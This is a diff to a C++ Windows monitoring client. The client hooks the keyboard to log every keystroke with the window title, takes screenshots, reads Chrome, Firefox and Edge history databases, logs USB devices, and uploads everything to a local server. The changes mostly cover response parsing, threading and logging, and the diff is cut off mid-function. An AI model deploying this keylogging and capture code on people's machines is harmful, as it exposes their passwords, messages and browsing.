@@ -125,6 +125,7 @@ std::string serverIP;
 std::string serverPort;
 std::string username;
 int screenInterval = SCREEN_INTERVAL;
+int ticInterval = TIC_INTERVAL;  // Dynamic tic interval from server
 double lastBrowserTic = -1;
 bool activeRunning = true;
 
@@ -211,6 +212,7 @@ bool sendTicEvent();
 bool sendBrowserHistories();
 bool sendKeyLogs();
 bool sendUSBLogs();
+bool updateUsername(const std::string& newUsername);
 void collectBrowserHistory();
 void setupKeyboardHook();
 void removeKeyboardHook();
@@ -238,6 +240,7 @@ void checkConnectionStatusChange();
 void updateTrayMenu();
 void manageMemoryLimits();
 void sendInitialDataRequests();
+void cleanupTemporaryFiles();
 
 // Show Windows notification
 void showToastNotification(const std::string& title, const std::string& message, const std::string& type) {
@@ -249,12 +252,12 @@ void showToastNotification(const std::string& title, const std::string& message,
         strcpy_s(nid.szInfoTitle, title.c_str());
         
         if (Shell_NotifyIconA(NIM_MODIFY, &nid)) {
-            writeDebugLog("Windows notification shown successfully: " + title + " - " + message);
+            // Notification shown successfully
         } else {
-            writeDebugLog("Failed to show Windows notification. Error: " + std::to_string(GetLastError()));
+            // Failed to show notification
         }
     } else {
-        writeDebugLog("System tray not available, cannot show notification");
+        // System tray not available
     }
 }
 
@@ -332,11 +335,8 @@ void updateTrayMenu() {
 
 // Setup USB monitoring using device notifications (more efficient)
 void setupUSBMONITORING() {
-    writeDebugLog("Starting USB monitoring setup with device notifications...");
-    
     usbMonitoringActive = true;
     usbMonitoringThread = std::thread([]() {
-        writeDebugLog("USB monitoring thread started with notifications");
         
         // Get initial USB devices list (one-time scan)
         std::set<std::string> knownDevices;
@@ -354,7 +354,7 @@ void setupUSBMONITORING() {
                 deviceIndex++;
             }
             SetupDiDestroyDeviceInfoList(deviceInfoSet);
-            writeDebugLog("Initial USB devices scan completed: " + std::to_string(knownDevices.size()) + " devices found");
+            // Initial USB devices scan completed
         }
         
         // Now use periodic checks but with much longer intervals (30 seconds instead of 2)
@@ -400,7 +400,7 @@ void setupUSBMONITORING() {
                             usbLog["device_type"] = "USB Device";
                             usbLog["action"] = "Connected";
                             
-                            writeDebugLog("USB Device Connected: " + deviceName + " (" + deviceIdStr + ")");
+                            // USB Device Connected
                             
                             // Show toast notification for USB device connected
                             showToastNotification("USB Device Connected", deviceName, "info");
@@ -426,7 +426,7 @@ void setupUSBMONITORING() {
                     usbLog["device_type"] = "USB Device";
                     usbLog["action"] = "Disconnected";
                     
-                    writeDebugLog("USB Device Disconnected: " + device);
+                    // USB Device Disconnected
                     
                     // Show toast notification for USB device disconnected
                     showToastNotification("USB Device Disconnected", "USB device was removed", "warning");
@@ -439,26 +439,20 @@ void setupUSBMONITORING() {
             knownDevices = currentDevices;
         }
         
-        writeDebugLog("USB monitoring thread stopped");
+        // USB monitoring thread stopped
     });
-    
-    writeDebugLog("USB monitoring setup completed (optimized)");
 }
 
 // Cleanup USB monitoring
 void cleanupUSBMONITORING() {
-    writeDebugLog("Cleaning up USB monitoring...");
-    
     usbMonitoringActive = false;
     
     if (usbMonitoringThread.joinable()) {
         usbMonitoringThread.join();
     }
-    
-    writeDebugLog("USB monitoring cleanup completed");
 }
 
-// Get MAC address
+// Get MAC address - improved version to get primary active adapter
 std::string getMacAddress() {
     std::string macAddress;
     ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
@@ -468,6 +462,7 @@ std::string getMacAddress() {
         return "";
     }
     
+    // First call to get required buffer size
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
         free(pAdapterInfo);
         pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
@@ -478,23 +473,92 @@ std::string getMacAddress() {
     
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
         PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+        std::string bestMac = "";
+        int bestPriority = -1;
+        
         while (pAdapter) {
-            // Accept both Ethernet and Wi-Fi adapters
-            if ((pAdapter->Type == MIB_IF_TYPE_ETHERNET || pAdapter->Type == IF_TYPE_IEEE80211) &&
-                pAdapter->AddressLength == 6) {
-                char mac[18];
-                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
-                    pAdapter->Address[0], pAdapter->Address[1],
-                    pAdapter->Address[2], pAdapter->Address[3],
-                    pAdapter->Address[4], pAdapter->Address[5]);
-                macAddress = std::string(mac);
-                break;
+            // Only process adapters with valid MAC addresses
+            if (pAdapter->AddressLength == 6) {
+                // Check if adapter has a valid IP address
+                bool hasValidIP = false;
+                PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
+                while (pIPAddr) {
+                    std::string ip = pIPAddr->IpAddress.String;
+                    if (!ip.empty() && ip != "0.0.0.0" && 
+                        ip.substr(0, 4) != "127." && 
+                        ip.substr(0, 8) != "169.254." &&
+                        ip.find(':') == std::string::npos) {
+                        hasValidIP = true;
+                        break;
+                    }
+                    pIPAddr = pIPAddr->Next;
+                }
+                
+                if (hasValidIP) {
+                    char mac[18];
+                    sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
+                        pAdapter->Address[0], pAdapter->Address[1],
+                        pAdapter->Address[2], pAdapter->Address[3],
+                        pAdapter->Address[4], pAdapter->Address[5]);
+                    
+                    // Priority system: Ethernet > Wi-Fi > Others
+                    int priority = 0;
+                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
+                        priority = 3; // Highest priority for Ethernet
+                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
+                        priority = 2; // Second priority for Wi-Fi
+                    } else if (pAdapter->Type == IF_TYPE_PPP) {
+                        priority = 1; // Low priority for PPP (dial-up, VPN)
+                    } else {
+                        priority = 0; // Lowest priority for others
+                    }
+                    
+                    // Also check adapter name for additional hints
+                    std::string adapterName = pAdapter->AdapterName;
+                    std::string description = pAdapter->Description;
+                    
+                    // Boost priority for adapters that are likely primary
+                    if (description.find("Ethernet") != std::string::npos || 
+                        description.find("Gigabit") != std::string::npos ||
+                        description.find("Realtek") != std::string::npos ||
+                        description.find("Intel") != std::string::npos) {
+                        priority += 1;
+                    }
+                    
+                    // Skip virtual adapters and tunnels
+                    if (description.find("Virtual") == std::string::npos &&
+                        description.find("Tunnel") == std::string::npos &&
+                        description.find("Loopback") == std::string::npos &&
+                        description.find("VMware") == std::string::npos &&
+                        description.find("VirtualBox") == std::string::npos) {
+                        
+                        if (priority > bestPriority) {
+                            bestMac = std::string(mac);
+                            bestPriority = priority;
+                            // Found candidate MAC
+                        }
+                    }
+                }
             }
             pAdapter = pAdapter->Next;
         }
+        
+        if (!bestMac.empty()) {
+            macAddress = bestMac;
+        }
+    } else {
+        // GetAdaptersInfo failed
     }
     
     free(pAdapterInfo);
+    
+    // Final validation
+    if (macAddress.empty()) {
+        // Could not determine MAC address
+    } else {
+        // MAC address determined
+    }
+    
     return macAddress;
 }
 
@@ -592,7 +656,7 @@ std::string takeScreenshot() {
     int captureWidth = desktopRect.right - desktopRect.left;
     int captureHeight = desktopRect.bottom - desktopRect.top;
     
-    writeDebugLog("Desktop dimensions: " + std::to_string(captureWidth) + "x" + std::to_string(captureHeight));
+    // Desktop dimensions captured
     
     // Create a bitmap at the correct resolution
     HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, captureWidth, captureHeight);
@@ -665,7 +729,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 
 // Send screenshot to server
 bool sendScreenshot(const std::string& filePath) {
-    std::string url = API_BASE_URL + API_ROUTE;
+    std::string url = API_BASE_URL + API_ROUTE + "?type=upload";
     std::string response = httpPostFile(url, filePath);
     
     // Delete the temporary file after sending
@@ -675,9 +739,9 @@ bool sendScreenshot(const std::string& filePath) {
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
-            if (root.isMember("Interval")) {
-                screenInterval = root["Interval"].asInt();
+        if (root.isMember("status") && root["status"].asString() == "success") {
+            if (root.isMember("data") && root["data"].isMember("interval")) {
+                screenInterval = root["data"]["interval"].asInt();
             }
             
             // Update connection status
@@ -687,14 +751,16 @@ bool sendScreenshot(const std::string& filePath) {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            writeDebugLog("Screenshot uploaded successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            writeDebugLog("Screenshot upload error: " + errorMsg);
         }
     }
-    
-    // Update connection status on failure
-    {
+    else {
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -724,9 +790,9 @@ bool sendTicEvent() {
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
-            if (root.isMember("LastBrowserTic")) {
-                lastBrowserTic = root["LastBrowserTic"].asDouble();
+        if (root.isMember("status") && root["status"].asString() == "success") {
+            if (root.isMember("data") && root["data"].isMember("interval")) {
+                ticInterval = root["data"]["interval"].asInt();
             }
             
             // Update connection status
@@ -736,14 +802,16 @@ bool sendTicEvent() {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            writeDebugLog("Tic event sent successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            writeDebugLog("Tic event error: " + errorMsg);
         }
     }
-    
-    // Update connection status on failure
-    {
+    else {
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastTicStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -780,7 +848,7 @@ bool sendBrowserHistories() {
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
+        if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
             browserHistories.clear();
             
@@ -791,14 +859,16 @@ bool sendBrowserHistories() {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            writeDebugLog("Browser history uploaded successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            writeDebugLog("Browser history upload error: " + errorMsg);
         }
     }
-    
-    // Update connection status on failure
-    {
+    else {
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastHistoryStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -835,7 +905,7 @@ bool sendKeyLogs() {
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
+        if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
             keyLogs.clear();
             
@@ -846,14 +916,16 @@ bool sendKeyLogs() {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            writeDebugLog("Key logs uploaded successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            writeDebugLog("Key log upload error: " + errorMsg);
         }
     }
-    
-    // Update connection status on failure
-    {
+    else {
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastKeyLogStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -899,7 +971,7 @@ bool sendUSBLogs() {
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
+        if (root.isMember("status") && root["status"].asString() == "success") {
             std::lock_guard<std::mutex> lock(dataMutex);
             usbDeviceLogs.clear();
             
@@ -910,14 +982,16 @@ bool sendUSBLogs() {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            writeDebugLog("USB logs uploaded successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            writeDebugLog("USB log upload error: " + errorMsg);
         }
     }
-    
-    // Update connection status on failure
-    {
+    else {
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastUSBLogStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -929,34 +1003,105 @@ bool sendUSBLogs() {
     return false;
 }
 
-// HTTP POST request
+// Update username on server
+bool updateUsername(const std::string& newUsername) {
+    std::string url = API_BASE_URL + API_ROUTE + "?type=username";
+    
+    Json::Value data;
+    data["username"] = newUsername;
+    
+    Json::FastWriter writer;
+    std::string jsonData = writer.write(data);
+    
+    std::string response = httpPost(url, jsonData);
+    
+    Json::Value root;
+    Json::Reader reader;
+    if (reader.parse(response, root)) {
+        if (root.isMember("status") && root["status"].asString() == "success") {
+            username = newUsername;  // Update local username
+            // Username updated successfully
+            return true;
+        } else if (root.isMember("error")) {
+            std::string errorMsg = root["error"].asString();
+            // Username update error
+        }
+    }
+    
+    // Failed to update username
+    return false;
+}
+
+// HTTP POST request - optimized with shorter timeouts
 std::string httpPost(const std::string& url, const std::string& data) {
     HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return "";
+    if (!hInternet) {
+        return "";
+    }
     
-    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    // Set shorter timeouts to prevent long blocking (5 seconds max)
+    DWORD timeout = 5000; // 5 seconds - reduced from 10
+    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+    
+    // Parse URL to get host and path
+    URL_COMPONENTSA urlComp;
+    ZeroMemory(&urlComp, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+    urlComp.dwSchemeLength = -1;
+    urlComp.dwHostNameLength = -1;
+    urlComp.dwUrlPathLength = -1;
+    
+    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
+        InternetCloseHandle(hInternet);
+        return "";
+    }
+    
+    std::string hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
+    std::string urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
+    
+    // Connecting to host
+    
+    // Connect to host
+    HINTERNET hConnect = InternetConnectA(hInternet, hostName.c_str(), 
+                                        urlComp.nPort == INTERNET_INVALID_PORT_NUMBER ? INTERNET_DEFAULT_HTTP_PORT : urlComp.nPort,
+                                        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return "";
+    }
+    
+    // Open request
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
+                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
         return "";
     }
     
     // Set headers
     std::string headers = "Content-Type: application/json\r\n";
-    HttpAddRequestHeadersA(hConnect, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
+    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
     
     // Send request
-    BOOL result = HttpSendRequestA(hConnect, NULL, 0, (LPVOID)data.c_str(), data.length());
+    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
     
     std::string response;
     if (result) {
         char buffer[1024];
         DWORD bytesRead;
-        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
+        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
             buffer[bytesRead] = '\0';
             response += buffer;
         }
+        // HTTP request successful
+    } else {
+        // Failed to send HTTP request
     }
     
+    InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
     
@@ -1009,14 +1154,19 @@ std::string httpPostFile(const std::string& url, const std::string& filePath) {
     std::string contentType = "multipart/form-data; boundary=" + boundary;
     
     std::string formData = "--" + boundary + "\r\n";
-    formData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + filePath + "\"\r\n";
+    formData += "Content-Disposition: form-data; name=\"imagefile\"; filename=\"" + filePath + "\"\r\n";
     formData += "Content-Type: image/jpeg\r\n\r\n";
     formData += fileContent + "\r\n";
     
-    // Add username to form data
+    // Add computer name to form data
     formData += "--" + boundary + "\r\n";
-    formData += "Content-Disposition: form-data; name=\"Username\"\r\n\r\n";
+    formData += "Content-Disposition: form-data; name=\"com_name\"\r\n\r\n";
     formData += username + "\r\n";
+    
+    // Add capture time to form data
+    formData += "--" + boundary + "\r\n";
+    formData += "Content-Disposition: form-data; name=\"ctime\"\r\n\r\n";
+    formData += getCurrentDateTimeString() + "\r\n";
     
     formData += "--" + boundary + "--\r\n";
     
@@ -1053,12 +1203,13 @@ std::string httpPostFile(const std::string& url, const std::string& filePath) {
     return response;
 }
 
-// Keyboard hook procedure
+// Keyboard hook procedure - optimized to reduce blocking
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         if (wParam == WM_KEYDOWN) {
             KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
             
+            // Prepare data outside of critical section
             std::string application = getActiveWindowTitle();
             std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
             std::string timestamp = getCurrentDateTimeString();
@@ -1072,16 +1223,26 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             
             std::string fullKeyName = modifiers + keyName;
             
+            // Create key log entry
             Json::Value keyLog;
             keyLog["date"] = timestamp;
             keyLog["application"] = application;
             keyLog["key"] = fullKeyName;
             
-            std::lock_guard<std::mutex> lock(dataMutex);
-            keyLogs.push_back(keyLog);
+            // Minimize time spent in critical section
+            bool shouldManageMemory = false;
+            {
+                std::lock_guard<std::mutex> lock(dataMutex);
+                keyLogs.push_back(keyLog);
+                
+                // Check memory limits less frequently to reduce overhead
+                if (keyLogs.size() % 50 == 0) { // Reduced from 100
+                    shouldManageMemory = true;
+                }
+            }
             
-            // Check memory limits periodically
-            if (keyLogs.size() % 100 == 0) {
+            // Manage memory outside of critical section
+            if (shouldManageMemory) {
                 manageMemoryLimits();
             }
         }
@@ -1148,7 +1309,7 @@ void collectBrowserHistory() {
             // Update the last fetch time
             if (maxTime > lastChromeFetch) {
                 lastChromeFetch = maxTime;
-                writeDebugLog("Updated Chrome last fetch time to: " + std::to_string(lastChromeFetch));
+                // Updated Chrome last fetch time
             }
         }
     }
@@ -1180,7 +1341,7 @@ void collectBrowserHistory() {
             // Update the last fetch time
             if (maxTime > lastFirefoxFetch) {
                 lastFirefoxFetch = maxTime;
-                writeDebugLog("Updated Firefox last fetch time to: " + std::to_string(lastFirefoxFetch));
+                // Updated Firefox last fetch time
             }
         }
     }
@@ -1212,7 +1373,7 @@ void collectBrowserHistory() {
             // Update the last fetch time
             if (maxTime > lastEdgeFetch) {
                 lastEdgeFetch = maxTime;
-                writeDebugLog("Updated Edge last fetch time to: " + std::to_string(lastEdgeFetch));
+                // Updated Edge last fetch time
             }
         }
     }
@@ -1248,10 +1409,10 @@ std::string getChromeHistory(int64_t sinceTime) {
     std::string query;
     if (sinceTime > 0) {
         query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
-        writeDebugLog("Chrome query with sinceTime: " + std::to_string(sinceTime));
+        // Chrome query with sinceTime
     } else {
         query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
-        writeDebugLog("Chrome query without sinceTime (first run)");
+        // Chrome query without sinceTime (first run)
     }
     sqlite3_stmt* stmt;
     
@@ -1344,10 +1505,10 @@ std::string getFirefoxHistory(int64_t sinceTime) {
     std::string query;
     if (sinceTime > 0) {
         query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
-        writeDebugLog("Firefox query with sinceTime: " + std::to_string(sinceTime));
+        // Firefox query with sinceTime
     } else {
         query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
-        writeDebugLog("Firefox query without sinceTime (first run)");
+        // Firefox query without sinceTime (first run)
     }
     sqlite3_stmt* stmt;
     
@@ -1410,10 +1571,10 @@ std::string getEdgeHistory(int64_t sinceTime) {
     std::string query;
     if (sinceTime > 0) {
         query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
-        writeDebugLog("Edge query with sinceTime: " + std::to_string(sinceTime));
+        // Edge query with sinceTime
     } else {
         query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
-        writeDebugLog("Edge query without sinceTime (first run)");
+        // Edge query without sinceTime (first run)
     }
     sqlite3_stmt* stmt;
     
@@ -1446,7 +1607,7 @@ std::string getEdgeHistory(int64_t sinceTime) {
     return writer.write(historyArray);
 }
 
-// Main monitoring task
+// Main monitoring task - optimized to prevent blocking
 void monitorTask() {
     auto lastScreenshot = std::chrono::steady_clock::now();
     auto lastTic = std::chrono::steady_clock::now();
@@ -1454,6 +1615,9 @@ void monitorTask() {
     auto lastKeyLog = std::chrono::steady_clock::now();
     auto lastUSBLog = std::chrono::steady_clock::now();
     auto lastConnectionTest = std::chrono::steady_clock::now();
+    auto lastMemoryCheck = std::chrono::steady_clock::now();
+
+    std::this_thread::sleep_for(std::chrono::seconds(5));
     
     // Test initial connection
     if (!testServerConnection()) {
@@ -1466,52 +1630,56 @@ void monitorTask() {
     while (activeRunning) {
         auto now = std::chrono::steady_clock::now();
         
-        // Test connection every 60 seconds
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 60) {
-            testServerConnection();
+        // Test connection every 120 seconds (reduced frequency)
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 120) {
+            std::thread([]() { testServerConnection(); }).detach();
             lastConnectionTest = now;
         }
         
-        // Screenshot
+        // Screenshot - run in separate thread to prevent blocking
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
-            std::string screenshotPath = takeScreenshot();
-            sendScreenshot(screenshotPath);
+            std::thread([]() {
+                std::string screenshotPath = takeScreenshot();
+                sendScreenshot(screenshotPath);
+            }).detach();
             lastScreenshot = now;
         }
         
-        // Tic event
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= TIC_INTERVAL) {
-            sendTicEvent();
+        // Tic event (using dynamic interval from server) - run in separate thread
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= ticInterval) {
+            std::thread([]() { sendTicEvent(); }).detach();
             lastTic = now;
         }
         
-        // Browser history
+        // Browser history - run in separate thread
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= HISTORY_INTERVAL) {
-            collectBrowserHistory();
-            sendBrowserHistories();
+            std::thread([]() {
+                collectBrowserHistory();
+                sendBrowserHistories();
+            }).detach();
             lastHistory = now;
         }
         
-        // Key logs
+        // Key logs - run in separate thread
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= KEY_INTERVAL) {
-            sendKeyLogs();
+            std::thread([]() { sendKeyLogs(); }).detach();
             lastKeyLog = now;
         }
         
-        // USB logs
+        // USB logs - run in separate thread
         if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= 30) {
-            sendUSBLogs();
+            std::thread([]() { sendUSBLogs(); }).detach();
             lastUSBLog = now;
         }
         
-        // Memory management check every 5 minutes
-        static auto lastMemoryCheck = std::chrono::steady_clock::now();
-        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastMemoryCheck).count() >= 300) {
+        // Memory management check every 2 minutes (more frequent)
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastMemoryCheck).count() >= 120) {
             manageMemoryLimits();
+            cleanupTemporaryFiles(); // Also clean up temporary files
             lastMemoryCheck = now;
         }
         
-        std::this_thread::sleep_for(std::chrono::seconds(1));
+        std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Reduced sleep time for more responsive checking
     }
 }
 
@@ -1546,15 +1714,13 @@ int main() {
     
     // Setup USB monitoring
     setupUSBMONITORING();
-    writeDebugLog("USB monitoring setup completed");
     
     // Setup system tray
     setupSystemTray();
-    writeDebugLog("System tray setup completed");
     
     // Start monitoring thread
     std::thread monitorThread(monitorTask);
-    writeDebugLog("Monitoring thread started");
+    // Monitoring thread started
     
     // Message loop for system tray
     MSG msg;
@@ -1595,7 +1761,7 @@ void writeDebugLog(const std::string& message) {
 bool loadSettings() {
     std::ifstream settingsFile("settings.ini");
     if (!settingsFile.is_open()) {
-        writeDebugLog("settings.ini not found. Using default settings.");
+        // settings.ini not found, using defaults
         serverIP = "192.168.1.45";
         serverPort = "8924";
         username = "default_user";
@@ -1648,7 +1814,7 @@ bool loadSettings() {
     settingsFile.close();
 
     API_BASE_URL = "http://" + serverIP + ":" + serverPort;
-    writeDebugLog("Loaded settings: ServerIP=" + serverIP + ", ServerPort=" + serverPort + ", Username=" + username);
+    // Settings loaded
     return true;
 }
 
@@ -1666,7 +1832,7 @@ void setupSystemTray() {
     wcex.lpszClassName = "MonitorTrayIcon";
     
     if (!RegisterClassExA(&wcex)) {
-        writeDebugLog("Failed to register window class for tray icon.");
+        // Failed to register window class
         return;
     }
 
@@ -1683,7 +1849,7 @@ void setupSystemTray() {
     );
     
     if (!hMainWindow) {
-        writeDebugLog("Failed to create main window for tray icon.");
+        // Failed to create main window
         return;
     }
     
@@ -1700,8 +1866,7 @@ void setupSystemTray() {
     strcpy_s(nid.szTip, "Monitor Client");
 
     if (!Shell_NotifyIconA(NIM_ADD, &nid)) {
-        DWORD error = GetLastError();
-        writeDebugLog("Failed to add tray icon. Error: " + std::to_string(error));
+        // Failed to add tray icon
         return;
     }
 
@@ -1712,7 +1877,7 @@ void setupSystemTray() {
     updateTrayIcon();
     updateTrayMenu();
     
-    writeDebugLog("System tray setup completed successfully.");
+    // System tray setup completed
 }
 
 // Cleanup system tray
@@ -1796,41 +1961,63 @@ void showConnectionError(const std::string& error) {
 // Test server connection
 bool testServerConnection() {
     std::string url = API_BASE_URL + TIC_ROUTE;
-    std::string response = httpPost(url, "{\"Event\":\"Ping\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
+    writeDebugLog("Testing connection to: " + url);
     
+    std::string response = httpPost(url, "{\"Event\":\"Tic\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
+    
+    // Check if we got any response at all
+    if (response.empty()) {
+        connectionStatus.serverConnected = false;
+        connectionStatus.lastError = "No response from server (server may be down or unreachable)";
+        writeDebugLog("Connection test failed: No response from server");
+        updateTrayIcon();
+        checkConnectionStatusChange();
+        return false;
+    }
+    
+    writeDebugLog("Server response: " + response);
+    
+    // Parse response
     Json::Value root;
     Json::Reader reader;
     if (reader.parse(response, root)) {
-        if (root.isMember("Status") && root["Status"].asString() == "OK") {
+        if (root.isMember("status") && root["status"].asString() == "success") {
             connectionStatus.serverConnected = true;
             connectionStatus.lastSuccess = std::chrono::steady_clock::now();
+            connectionStatus.lastError = "";
+            writeDebugLog("Connection test successful");
             updateTrayIcon();
             checkConnectionStatusChange();
             return true;
         } else {
             connectionStatus.serverConnected = false;
             connectionStatus.lastError = "Server responded with error: " + response;
+            writeDebugLog("Connection test failed: Server error response");
             updateTrayIcon();
             checkConnectionStatusChange();
             return false;
         }
     } else {
         connectionStatus.serverConnected = false;
-        connectionStatus.lastError = "Failed to parse server response: " + response;
+        connectionStatus.lastError = "Server returned invalid JSON: " + response;
+        writeDebugLog("Connection test failed: Invalid JSON response");
         updateTrayIcon();
         checkConnectionStatusChange();
         return false;
     }
 } 
 
-// Helper function to get the local network IPv4 address (robust version)
+// Helper function to get the local network IPv4 address - improved version
 std::string getLocalIPAddress() {
+    std::string foundIP = "Unknown";
     ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
     PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
+    
     if (pAdapterInfo == NULL) {
         return "Unknown";
     }
-
+    
+    // First call to get required buffer size
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
         free(pAdapterInfo);
         pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
@@ -1838,58 +2025,152 @@ std::string getLocalIPAddress() {
             return "Unknown";
         }
     }
-
-    std::string foundIP = "Unknown";
+    
     if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
